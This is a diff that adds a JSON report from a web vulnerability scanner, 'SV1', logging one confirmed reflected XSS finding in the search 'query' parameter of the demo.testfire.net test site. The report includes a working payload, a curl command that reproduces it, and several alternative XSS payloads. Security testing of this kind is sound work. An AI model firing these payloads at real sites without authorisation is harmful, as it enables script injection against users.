@@ -1,0 +1,76 @@
+{
+  "tool": "SV1",
+  "author": "ee.zvz",
+  "version": "1.2.0",
+  "meta": {
+    "target": "http://demo.testfire.net/search.jsp?query=test",
+    "crawl": false,
+    "depth": 0,
+    "scanners": [
+      "xss"
+    ],
+    "time_based": false,
+    "union": true,
+    "replay": false,
+    "browser": true,
+    "stored": false,
+    "hidden": false,
+    "js": false,
+    "second_order": false,
+    "dump": false,
+    "spa": false,
+    "openapi": false,
+    "blind": false,
+    "ssrf": false,
+    "oob": "",
+    "fail_on": "any",
+    "scope": "",
+    "db": "",
+    "sarif": "",
+    "retest": false
+  },
+  "stats": {
+    "pages": 1,
+    "points": 1,
+    "requests": 11,
+    "errors": 0,
+    "verified": 0,
+    "unverified": 0,
+    "fixed": 0,
+    "retest": false,
+    "duration_seconds": 8.11
+  },
+  "counts": {
+    "total": 1,
+    "by_severity": {
+      "HIGH": 1
+    },
+    "by_type": {
+      "XSS": 1
+    }
+  },
+  "findings": [
+    {
+      "kind": "XSS",
+      "severity": "HIGH",
+      "url": "http://demo.testfire.net/search.jsp",
+      "method": "GET",
+      "param": "query",
+      "payload": "<svg/onload=alert('sv1a041d253')>sv1a041d253",
+      "confidence": "CONFIRMED",
+      "evidence": "executed in chromium: alert:sv1a041d253",
+      "technique": "reflected/text",
+      "detail": "in HTML text flow | proof: alert fired",
+      "artifact": "altoro-artifacts/xss-01.png",
+      "curl": "curl -sS 'http://demo.testfire.net/search.jsp?query=%3Csvg%2Fonload%3Dalert%28%27sv1a041d253%27%29%3Esv1a041d253'",
+      "data": {},
+      "alternatives": [
+        "<img src=x onerror=alert('sv1a041d253')>sv1a041d253",
+        "<script>alert('sv1a041d253')</script>sv1a041d253",
+        "sv1a041d253\"><svg/onload=alert('sv1a041d253')>",
+        "sv1a041d253'><svg/onload=alert('sv1a041d253')>",
+        "sv1a041d253</title><svg/onload=alert('sv1a041d253')>"
+      ]
+    }
+  ]
+}
